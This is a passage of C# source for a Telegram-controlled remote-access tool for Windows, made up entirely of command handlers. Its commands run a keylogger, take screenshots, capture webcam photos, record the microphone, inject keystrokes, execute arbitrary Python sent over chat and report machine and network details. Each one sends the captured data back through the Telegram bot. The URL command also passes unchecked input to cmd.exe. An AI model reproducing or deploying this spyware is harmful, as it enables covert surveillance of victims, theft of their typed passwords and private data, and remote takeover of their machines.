                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "text",
            Description = "Send text input",
            Example = "/text hello world",
            ArgsCount = -2,
            Execute = async model =>
            {
                try
                {
                    new KeyboardSimulator(new InputSimulator()).TextEntry(model.RawArgs);
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "screenshot",
            Aliases = new[] { "screen" },
            ArgsCount = 0,
            Description = "Take a screenshot of all displays area.",
            Example = "/screenshot",
            Execute = async model =>
            {
                try
                {
                    Rectangle bounds = WinAPI.GetScreenBounds();

                    using Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
                    using Graphics graphics = Graphics.FromImage(bitmap);
                    using MemoryStream screenshotStream = new MemoryStream();
                    graphics.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);

                    bitmap.Save(screenshotStream, ImageFormat.Png);

                    screenshotStream.Position = 0;

                    await Program.Bot.SendPhoto(chatId: model.Message.Chat.Id, photo: screenshotStream, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "webcam",
            ArgsCount = 0,
            Description = "Take a photo from webcamera.",
            Example = "/webcam",
            Execute = async model =>
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        Bitmap photoBitmap;
                        MemoryStream photoStream = new MemoryStream();

                        FilterInfoCollection captureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        if (captureDevices.Count == 0)
                        {
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "This pc has no webcamera.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            return;
                        }

                        VideoCaptureDevice device = new VideoCaptureDevice(captureDevices[0].MonikerString);
                        device.NewFrame += (sender, args) =>
                        {
                            photoBitmap = args.Frame.Clone() as Bitmap;
                            photoBitmap.Save(photoStream, ImageFormat.Png);
                            (sender as VideoCaptureDevice).SignalToStop();
                        };

                        device.Start();
                        device.WaitForStop();

                        photoStream.Position = 0;

                        InputFileStream photoOnlineFile = new InputFileStream(photoStream);
                        await Program.Bot.SendPhoto(model.Message.Chat.Id, photoOnlineFile, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        photoStream.Close();
                    }
                    catch (Exception ex)
                    {
                        await Program.ReportExceptionAsync(model.Message, ex);
                    }
                });
            }

        });

        commandsList.Add(new BotCommand
        {
            Command = "message",
            Aliases = new[] { "msg" },
            ArgsCount = -2,
            Description = "Send message with dialog window.",
            Example = "message Lorem ipsum",
            Execute = async model =>
            {

                try
                {
                    var ShowMessageBoxResult = WinAPI.ShowMessageBoxAsync(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL | WinAPI.MsgBoxFlag.MB_ICONINFORMATION);
                    _ = Program.Bot.SendMessage(model.Message.Chat.Id, "Sent!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    await ShowMessageBoxResult;
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Message box closed", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });

                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }

        });

        commandsList.Add(new BotCommand
        {
            Command = "openurl",
            Aliases = new[] { "url" },
            ArgsCount = -2,
            Description = "Open URL on default browser.",
            Example = "/openurl google.com",
            Execute = async model =>
            {
                string url = model.RawArgs;
                if (url.Contains("://") is false)
                {
                    url = "https://" + url;
                }
                ProcessStartInfo info = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c start {url}",
                    CreateNoWindow = true
                };

                Process.Start(info);

                await Program.Bot.SendMessage(model.Message.Chat.Id, "Url opened!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
            }
        });
    }

    private static void MonitoringCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "keylog",
            Description = "Keylog starts and ends with no args.",
            Execute = async model =>
            {
                try
                {
                    if (KeylogActive)
                    {
                        KeylogActive = false;
                        return;
                    }

                    await Program.Bot.SendMessage(
                        model.Message.Chat.Id,
                        "Keylog started!",
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });

                    KeylogActive = true;

                    await using var keylogFileStream = new FileStream(
                        "keylog.txt",
                        FileMode.Create,
                        FileAccess.Write,
                        FileShare.Read,
                        bufferSize: 4096,
                        useAsync: true);
                    using var streamWriter = new StreamWriter(
                        keylogFileStream,
                        Encoding.UTF8,
                        bufferSize: 1024,
                        leaveOpen: true);

                    await streamWriter.WriteLineAsync("#Keylog entries (mapped and unmapped).");
                    await streamWriter.WriteLineAsync("#Remember, mapped keylog is not the \"clear\" input.");
                    await streamWriter.WriteLineAsync(string.Empty);

                    const int snippetMaxLength = 1024;
                    var snippetBuilder = new StringBuilder();
                    List<uint> lastKeys = new List<uint>();

                    while (KeylogActive)
                    {
                        var keys = KeylogKeyProvider();
                        if (!lastKeys.SequenceEqual(keys))
                        {
                            if (keys.Count > 0)
                            {
                                var mappedBatch = string.Join(' ', keys.Select(KeylogKeyMapper));
                                var unmappedBatch = string.Join(' ', keys.Select(key => key.ToString("X")));

                                await streamWriter.WriteLineAsync($"Mapped: {mappedBatch}");
                                await streamWriter.WriteLineAsync($"Unmapped: {unmappedBatch}");
                                await streamWriter.WriteLineAsync(string.Empty);
                                await streamWriter.FlushAsync();

                                snippetBuilder.Append(mappedBatch);
                                snippetBuilder.Append(' ');
                                if (snippetBuilder.Length > snippetMaxLength)
                                {
                                    snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
                                }
                            }

                            lastKeys = new List<uint>(keys);
                        }

                        await Task.Delay(50);
                    }

                    await streamWriter.WriteLineAsync("#Keycodes table - https://docs.microsoft.com/ru-ru/windows/win32/inputdev/virtual-key-codes");
                    await streamWriter.FlushAsync();

                    var recipientId = model.Message.From?.Id ?? model.Message.Chat.Id;

                    var snippet = snippetBuilder.ToString().Trim();
                    await Program.Bot.SendMessage(
                        recipientId,
                        "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName + ": \n" + snippet);

                    await using var fs = new FileStream(
                        "keylog.txt",
                        FileMode.Open,
                        FileAccess.Read,
                        FileShare.Read,
                        bufferSize: 4096,
                        useAsync: true);
                    var inputFile = new InputFileStream(fs, fileName: "keylog.txt");
                    await Program.Bot.SendDocument(
                        recipientId,
                        inputFile,
                        caption: "Keylog from " + Environment.MachineName + ". User: " + Environment.UserName);

                    File.Delete("keylog.txt");
                }
                catch (Exception ex)
                {
                    KeylogActive = false;
                    try
                    {
                        if (File.Exists("keylog.txt"))
                            File.Delete("keylog.txt");
                    }
                    catch
                    {
                        // ignored
                    }
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "audio",
            ArgsCount = 1,
            Description = "Record audio from microphone for given amount of secs.",
            Example = "/audio 50",
            Execute = async model =>
            {
                try
                {
                    if (WaveInEvent.DeviceCount == 0)
                    {
                        await Program.Bot.SendMessage(
                            model.Message.Chat.Id,
                            "This machine has no audio input devices, the recording isn't possible.",
                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }

                    if (!uint.TryParse(model.Args[0], out uint recordLength))
                    {
                        await Program.Bot.SendMessage(
                            model.Message.Chat.Id,
                            "Argument must be a positive integer!",
                            replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }

                    using WaveInEvent waveIn2 = new WaveInEvent
                    {
                        WaveFormat = new WaveFormat(44100, 1)
                    };

                    using MemoryStream memstrm = new MemoryStream();
                    using WaveFileWriter waveFileWriter2 = new WaveFileWriter(memstrm, waveIn2.WaveFormat);

                    waveIn2.DataAvailable += (_, args) =>
                    {
                        waveFileWriter2.Write(args.Buffer, 0, args.BytesRecorded);
                        waveFileWriter2.Flush();
                    };

                    waveIn2.StartRecording();
                    await Program.Bot.SendMessage(
                        model.Message.Chat.Id,
                        "Start recording",
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    await Program.Bot.SendChatAction(model.Message.Chat.Id, ChatAction.RecordVoice);

                    await Task.Delay(TimeSpan.FromSeconds(recordLength));

                    waveIn2.StopRecording();

                    memstrm.Position = 0;

                    await Program.Bot.SendVoice(
                        model.Message.Chat.Id,
                        new InputFileStream(memstrm, fileName: "record"),
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });
    }

    private static void ScriptingCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "py",
            Aliases = new[] { "python" },
            Description = "Execute python expression or file. To execute file attach it to message or send it and reply to it with command /py. Mind that all expressions and files execute in the same script scope. To clear scope /pyclearscope",
            Example = "/py print('Hello World')",
            Execute = async model =>
            {
                try
                {
                    if (model.Files.Length == 0)
                    {
                        if (model.Args.Length == 0)
                        {
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Need an expression or file to execute",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                            return;
                        }

                        using var pyStream = new MemoryStream();
                        PythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);

                        PythonEngine.Execute(model.RawArgs, PythonScope);
                        pyStream.Position = 0;

                        if (pyStream.Length > 0)
                        {
                            using var reader = new StreamReader(pyStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true, bufferSize: 1024, leaveOpen: false);
                            string output = new string(reader.ReadToEnd().Take(4096).ToArray());
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                $"Executed! Output:\n{output}",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        }
                        else
                        {
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Executed!",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        }
                        return;
                    }

                    if (model.Filename != null && model.Filename.Contains(".py"))
                    {
                        using var outputStream = new MemoryStream();
                        PythonEngine.Runtime.IO.SetOutput(outputStream, Encoding.UTF8);

                        var file = await Program.Bot.GetFile(model.Files[0].FileId);
                        await using (var scriptFileStream = new FileStream(
                                   "UserScript.py",
                                   FileMode.Create,
                                   FileAccess.Write,
                                   FileShare.None,
                                   bufferSize: 4096,
                                   useAsync: true))
                        {
                            await Program.Bot.DownloadFile(file.FilePath, scriptFileStream);
                        }

                        PythonEngine.ExecuteFile("UserScript.py", PythonScope);

                        outputStream.Position = 0;

                        using var reader = new StreamReader(outputStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true, bufferSize: 1024, leaveOpen: false);
                        string outputText = new string(reader.ReadToEnd().Take(4096).ToArray());

                        if (outputText.Length > 0)
                        {
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                $"Executed! Output: {outputText}",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        }
                        else
                        {
                            await Program.Bot.SendMessage(
                                model.Message.Chat.Id,
                                "Executed!",
                                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        }

                        File.Delete("UserScript.py");
                        return;
                    }

                    await Program.Bot.SendMessage(
                        model.Message.Chat.Id,
                        "This file is not a python script!",
                        replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    try
                    {
                        if (File.Exists("UserScript.py"))
                            File.Delete("UserScript.py");
                    }
                    catch
                    {
                        // ignored
                    }
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
                finally
                {
                    PythonEngine.Runtime.IO.SetOutput(Stream.Null, Encoding.UTF8);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "pyclearscope",
            ArgsCount = 0,
            Description = "Clear python execution scope.",
            Execute = async model =>
            {
                PythonScope = PythonEngine.CreateScope();
                await Program.Bot.SendMessage(model.Message.Chat.Id, "Cleared!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
            }
        });
    }

    private static void MiscellaneousCommands(ICollection<BotCommand> commandsList)
    {
        commandsList.Add(new BotCommand
        {
            Command = "netinfo",
            Description = "Show info about internet connection",
            Example = "/netinfo",
            ArgsCount = 0,
            Execute = async model =>
            {
                var ipAddress = await Utils.GetIpAddressAsync();
                var networkInfo = await Utils.GetFromJsonAsync<NetworkInfo>("http://ip-api.com/json/" + ipAddress);

                string networkInformationString = "Network information:\n\n" +
                $"IP: {ipAddress}\n" +
                $"ISP: {networkInfo.Isp}\n" +
                $"Country: {networkInfo.Country}\n" +
                $"City: {networkInfo.City}\n" +
                $"Timezone: {networkInfo.Timezone}\n" +
                $"Country Code: {networkInfo.CountryCode}";

                await Program.Bot.SendMessage(model.Message.Chat.Id, networkInformationString);
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "config",
            Description = "Configure settings.",
            Example = "Not implemented",
            Execute = async model =>
            {
                await Program.Bot.SendMessage(model.Message.Chat.Id, "Config command is not yet implemented.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "window",
            Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
            "<i>i</i> | <i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
            "<i>min</i> | <i>minimize</i> - Minimize window\n\n" +
            "<i>max</i> | <i>maximize</i> - Maximize window\n\n" +
            "<i>r</i> | <i>restore</i> - Restore size and position of window\n\n" +
            "<i>sf</i> | <i>setfocus</i> - Set focus to window" +
            "<i>c</i> | <i>close</i> - Close window\n\n",
            Example = "/window close Calculator",
            ArgsCount = -2,
            Execute = async model =>
            {
                await Task.Run(async () =>
                {
                    try
                    {
                        IntPtr hWnd;
                        if (model.Args[0].ToLower() == "info" || model.Args[0].ToLower() == "i")
                        {
                            if (model.Args.Length == 1)
                                hWnd = ForegroundWindowGetter();
                            else
                            {
                                if (model.Args[1].Contains("0x"))
                                {
                                    string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
                                    long pointerValue = long.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
                                    var handle = new IntPtr(pointerValue);
                                    hWnd = handle;
                                }
                                else
                                {
                                    hWnd = WindowFinder(null, string.Join(' ', model.Args.Skip(1)));
                                }
                                if (hWnd == IntPtr.Zero || WindowValidator(hWnd) is false)
                                {
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Window not found!", replyMarkup: null, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    return;
                                }
                            }

                            Rectangle windowBounds = WindowBoundsGetter(hWnd);

                            string windowInfo =
                            "Window info\n" +
                            "\n" +
                            $"Title: <code>{WindowTitleGetter(hWnd)}</code>\n" +
                            $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                            $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                            $"Pointer: <code>0x{hWnd:X}</code>\n\n" +

                            $"Associated Process: <code>{ProcessIdGetter(ProcessHandleFromWindow(hWnd))}</code>";

                            MemoryStream windowCaptureStream = new MemoryStream();

                            WindowCapture(hWnd, windowCaptureStream);

                            windowCaptureStream.Position = 0;

                            await Program.Bot.SendPhoto(model.Message.Chat.Id, windowCaptureStream, windowInfo, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }, parseMode: ParseMode.Html);

                            return;
                        }

                        if (model.Args.Length > 1)
                        {
                            if (model.Args[1].Contains("0x"))
                            {
                                string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
                                long pointerValue = long.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
                                var handle = new IntPtr(pointerValue);
                                hWnd = handle;
                            }
                            else
                            {
                                hWnd = WindowFinder(null, string.Join(' ', model.Args.Skip(1)));
                            }
                            if (hWnd == IntPtr.Zero || WindowValidator(hWnd) is false)
                            {
                                await Program.Bot.SendMessage(model.Message.Chat.Id, "Window not found!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                return;
                            }
                            switch (model.Args[0].ToLower())
                            {
                                case "min":
                                case "minimize":
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    break;

                                case "max":
                                case "maximize":
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    break;

                                case "sf":
                                case "setfocus":
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    break;

                                case "r":
                                case "restore":
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    break;

                                case "c":
                                case "close":
                                    WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    break;


                                default:
                                    await Program.Bot.SendMessage(model.Message.Chat.Id, "No such usage for /window. Type /help window for info.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                                    return;
                            }
                        }
                        else
                        {
                            await Program.Bot.SendMessage(model.Message.Chat.Id, "Only <i>info</i> usage requires no args", ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        }
                    }
                    catch (Exception ex)
                    {
                        await Program.ReportExceptionAsync(model.Message, ex);
                    }
                });
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "wallpaper",
            Aliases = new[] { "wllppr" },
            ArgsCount = 0,
            Description = "Change wallpapers. Don't forget to attach the image.",
            Execute = async model =>
            {
                try
                {
                    if (model.Files.Length == 0)
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "No image or file provided.", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                        return;
                    }
                    var telegramFile = await Program.Bot.GetFile(model.Files.Last().FileId);

                    using (FileStream wallpapperImageFileStream = new FileStream(Path.GetTempPath() + "wllppr.jpg", FileMode.Create))
                    {
                        await Program.Bot.DownloadFile(telegramFile.FilePath, wallpapperImageFileStream);
                    }
                    WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Path.GetTempPath() + "wllppr.jpg", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                    File.Delete(Path.GetTempPath() + "wllppr.jpg");
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "repeat",
            Aliases = new[] { "rr", "rpt" },
            Description = "Repeat command by replying to a message",
            ArgsCount = 0,
            Execute = async model =>
            {
                if (model.Message.ReplyToMessage == null)
                {
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Reply to message", replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }
                BotCommandModel replyMessageModel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);

                if (replyMessageModel == null)
                {
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Unable to repeat command from this message");
                    return;
                }

                var cmd = Program.Commands.Find(command => command.Command == replyMessageModel.Command);

                if (cmd == null)
                {
                    cmd = Program.Commands.Find(c => c.Aliases != null && c.Aliases.Contains(replyMessageModel.Command, StringComparer.OrdinalIgnoreCase));
                    if (cmd == null)
                    {
                        await Program.Bot.SendMessage(model.Message.Chat.Id, "This message does not contain a recognized command");
                        return;
                    }
                    else
                    {
                        replyMessageModel.Command = cmd.Command;
                    }
                }

                if (cmd.ValidateModel(replyMessageModel))
                    await cmd.Execute(replyMessageModel);
                else
                    await Program.Bot.SendMessage(model.Message.Chat.Id, "Unable to repeat command from this message");
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "info",
            Description = "Get info about environment and this program process",
            ArgsCount = 0,
            Execute = async model =>
            {
                try
                {
                    string systemInfoString =
                    $"User name: {Environment.UserName}\n" +
                    $"PC name: {Environment.MachineName}\n\n" +

                    $"OS: {Utils.GetWindowsVersion()}({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})\n" +
                    $"NT version: {Environment.OSVersion.Version}\n" +
                    $"Process: {(Environment.Is64BitProcess ? "64-bit" : "32-bit")}\n\n" +
                    $"To get ip address and other network info type /netinfo";


                    await Program.Bot.SendMessage(model.Message.Chat.Id, systemInfoString, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                }
                catch (Exception ex)
                {
                    await Program.ReportExceptionAsync(model.Message, ex);
                }
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "getid",
            ArgsCount = 0,
            Description = "Get chat or user id. To get user's id type this command as answer to user message.",
            Example = "/getid",
            Execute = async model =>
            {
                if (model.Message.ReplyToMessage != null)
                {
                    await Program.Bot.SendMessage(model.Message.Chat.Id, $"User id: <code>{model.Message.ReplyToMessage.From.Id}</code>", ParseMode.Html, replyParameters: new ReplyParameters { MessageId = model.Message.MessageId });
                    return;
                }
                await Program.Bot.SendMessage(model.Message.Chat.Id, $"This chat id: <code>{model.Message.Chat.Id}</code>", ParseMode.Html);
            }
        });

        commandsList.Add(new BotCommand
        {
            Command = "commands",
            Description = "Get all commands list sorted by alphabet",
            ArgsCount = 0,
            Execute = async model =>
            {
                StringBuilder commandListBuilder = new StringBuilder("List of all commands:\n\n");

                foreach (BotCommand command in commandsList.OrderBy(x => x.Command))
                {
                    commandListBuilder.AppendLine("/" + command.Command);
                }

                commandListBuilder.AppendLine("\nHold to copy command");
                await Program.Bot.SendMessage(
                    model.Message.Chat.Id,
                    commandListBuilder.ToString(),
                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId }
                );
            }
        });
    }
}
